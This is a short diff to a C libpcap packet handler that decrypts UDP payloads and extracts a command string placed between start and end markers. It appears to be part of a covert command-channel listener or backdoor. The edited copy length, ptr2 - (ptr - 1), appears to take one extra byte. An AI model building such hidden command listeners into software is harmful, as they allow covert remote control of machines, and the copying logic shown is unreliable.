@@ -59,9 +59,9 @@ void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char 
 	short port;
 	int hdr_len, start_len, end_len;
 
-	hdr_len = strlen(HDR_KEY) + 1;
-	start_len = strlen(CMD_STR) + 1;
-	end_len = strlen(CMD_END) + 1;
+	hdr_len = strlen(HDR_KEY);
+	start_len = strlen(CMD_STR);
+	end_len = strlen(CMD_END);
 
 	/* Step 1: locate the payload portion of the packet */
 	ptr = (char *)(packet + ETHER_IP_UDP_LEN);
@@ -86,6 +86,7 @@ void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char 
 	//Step 4: verify decrypted contents
 	if (!(ptr = strstr(decryptMsg, CMD_STR)))
 		return;
+
 	ptr += start_len;
 
 	if (!(ptr2 = strstr(ptr, CMD_END)))
@@ -93,7 +94,7 @@ void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char 
 
 	// Step 5: extract the remainder
 	command = (char*) calloc(1, MAX_LEN);
-	strncpy(command, ptr, (ptr2 - ptr));
+	strncpy(command, ptr, (ptr2 - (ptr - 1)));
 
 	free(decryptMsg);
 
